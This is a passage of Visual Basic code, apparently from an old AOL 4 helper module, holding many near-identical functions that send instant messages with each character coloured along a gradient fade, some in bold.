        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackPurpleBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackedRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlackYellowBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBluePurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBluePurpleBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueRedBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBlueYellowBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBoldBlackBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackPurpleBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackedRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackYellowBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBluePurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBluePurpleBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueRedBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlueYellowBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenPurpleGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenRedGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreenYellowGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyBlueGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyGreenGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyPurpleGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyRedGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImGreyYellowGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("" + Msg + "")
End Function
Function AoL4_ImBoldGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenPurpleGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenRedGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenYellowGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyBlueGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
